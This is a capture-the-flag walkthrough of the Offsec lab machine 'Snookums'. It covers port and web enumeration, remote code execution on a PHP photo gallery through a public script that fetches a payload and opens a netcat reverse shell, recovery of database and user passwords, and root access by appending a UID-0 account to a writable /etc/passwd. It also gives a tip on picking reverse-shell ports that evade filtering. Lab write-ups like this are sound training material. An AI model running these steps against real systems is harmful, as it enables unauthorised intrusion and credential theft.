---
title: CTF Writeup - Offsec PG Snookums
date: 2023-10-18 
author: kei5uke
description: Writeup for PG Snookums 
tags:
  - linux
  - writeup
---

# snookums

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/snook]
└─# nmap -sC -sV -p- -T4 192.168.239.58 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 12:53 EEST
Nmap scan report for 192.168.239.58
Host is up (0.046s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  P(F�      Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=10/18%Time=652FAB8E%P=aarch64-unknown-linux-
SF:gnu%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusReque
SF:stTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServe
SF:rCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20me
SF:ssage\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBPr
SF:ogNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPD
SF:String,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mes
SF:sage\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIP
SF:Options,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mes
SF:sage\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2023-10-18T05:55:48-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m36s, median: 0s
| smb2-time: 
|   date: 2023-10-18T09:55:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.70 seconds
```

## FTP

```bash
┌──(root💀kali)-[~]
└─# ftp 192.168.239.58
Connected to 192.168.239.58.
220 (vsFTPd 3.0.2)
Name (192.168.239.58:parallels): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||53160|).
ftp: Can't connect to `192.168.239.58:53160': Connection timed out
200 EPRT command successful. Consider using EPSV.

421 Service not available, remote server timed out. Connection closed.
```

## SMB

```bash
┌──(root💀kali)-[~/snook]
└─# smbclient -L 192.168.239.58   
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
SMB1 disabled -- no workgroup available
```

```bash
┌──(root💀kali)-[~/snook]
└─# smbclient \\\\192.168.239.58\\IPC$                                                                            1 ⨯
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> put test.html
test.html does not exist
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> pwd
Current directory is \\192.168.239.58\IPC$\
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> put ./test.html
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \test.html
smb: \> put test.html
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \test.html
smb: \> put ~/test.html
~/test.html does not exist                                                                                            
smb: \> put ~/snook/test.html                                                                                         
~/snook/test.html does not exist                                                                                      
smb: \> put ~/snook/test.html                                                                                         
~/snook/test.html does not exist                                                                                      
smb: \> put ~/snook/test.html test.html                                                                               
~/snook/test.html does not exist                                                                                      
smb: \> put test.html test.html
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \test.html
```

## MySQL

```bash
┌──(root💀kali)-[~/snook]
└─# mysql -h 192.168.239.58
ERROR 1130 (HY000): Host '192.168.45.240' is not allowed to connect to this MySQL server
```

## HTTP

```bash
┌──(root💀kali)-[~/snook]
└─# gobuster dir -u http://192.168.239.58/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.239.58/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/10/18 17:50:36 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 234] [--> http://192.168.239.58/css/]
/js                   (Status: 301) [Size: 233] [--> http://192.168.239.58/js/]
/images               (Status: 301) [Size: 237] [--> http://192.168.239.58/images/]
/photos               (Status: 301) [Size: 237] [--> http://192.168.239.58/photos/]
Progress: 23992 / 30001 (79.97%)[ERROR] 2023/10/18 17:52:27 [!] parse "http://192.168.239.58/error\x1f_log": net/url: invalid control character in URL
Progress: 29985 / 30001 (99.95%)
===============================================================
2023/10/18 17:52:55 Finished
===============================================================
```

```bash
┌──(root💀kali)-[~/snook]
└─# nikto -host 192.168.239.58 -port 80                                                                                  1 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.239.58
+ Target Hostname:    192.168.239.58
+ Target Port:        80
+ Start Time:         2023-10-18 17:48:33 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ 8724 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2023-10-18 17:56:30 (GMT3) (477 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Exploit

### Payload

It appears that this application is vulnerable against remote code execution.

```bash
http://192.168.239.58/image.php?img=
```

[https://github.com/beauknowstech/SimplePHPGal-RCE.py](https://github.com/beauknowstech/SimplePHPGal-RCE.py)

I found interesting python script on Github.

```bash
┌──(root💀kali)-[~/snook/SimplePHPGal-RCE.py]
└─# python3 SimplePHPGal-RCE.py http://192.168.239.58 192.168.45.240 21
[✔] Serving HTTP traffic from /root/snook/SimplePHPGal-RCE.py on 192.168.45.240 using port 80 in background
Run 'nc -nlvp 21' on attacker machine in another terminal. Then press any key to continue
Attempting to reach reverse shell on 192.168.45.240 on port 80
192.168.239.58 - - [18/Oct/2023 18:32:37] "GET /rev.php HTTP/1.0" 200 -
Request sent. Check your nc for a connection
```

```bash
┌──(root💀kali)-[~]
└─# rlwrap nc -lvnp 21                                                                                                   1 ⨯
listening on [any] 21 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.239.58] 59708
SOCKET: Shell has connected! PID: 4380

ls
README.txt
UpgradeInstructions.txt
css
db.php
embeddedGallery.php
functions.php
image.php
images
index.php
js
license.txt
photos
phpGalleryConfig.php
phpGalleryStyle-RED.css
phpGalleryStyle.css
phpGallery_images
phpGallery_thumbs
thumbnail_generator.php

whoami
apache
```

I ran the script and waited for the connection using netcat, and then I got the shell.

## Privilege Escalation

```bash
bash-4.2$ pwd
pwd
/var/www/html
bash-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>

bash-4.2$ mysql -u root -p
mysql -u root -p
Enter password: MalapropDoffUtilize1337

Welcome to the MySQL monitor.  Commands end with ; or \g.
```

```bash
mysql> use SimplePHPGal
use SimplePHPGal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.01 sec)

mysql> select * from users;
select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)
```

```bash
┌──(root💀kali)-[~/snook]
└─# echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 --decode | base64 --decode
HockSydneyCertify123
```

```bash
┌──(root💀kali)-[~/snook]
└─# ssh michael@192.168.239.58                                                                                         126 ⨯
michael@192.168.239.58's password: 
Last login: Wed Oct 18 12:09:34 2023
[michael@snookums ~]$ 
[michael@snookums ~]$ ls
local.txt
```

I got michael’s shell.

## Root Shell

![Screenshot 2023-10-18 at 19.29.39.png](snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.29.39.png)

/etc/paswd is writable. This is bad. 

```bash
[root@snookums ~]# openssl passwd hello
4eDdB38csmWpI
[root@snookums ~]# echo 'sasuke:4eDdB38csmWpI:0:0:root:/root:/bin/bash' >> /etc/passwd
```

![Screenshot 2023-10-18 at 19.27.43.png](snookums%20d2e709fcc8c44a989ed6778cc9de179d/Screenshot_2023-10-18_at_19.27.43.png)

I switched the user “sasuke” with password hello, and I got the shell.

# Note

I almost gave up trying to get a shell using the discovered script, which was configured to use port 4444 for the attacker. I finally succeeded by changing the port to 21. When implementing a reverse shell, it's crucial to reuse an open port on the target machine from the attacker's machine. This minimizes the likelihood of the connection being blocked.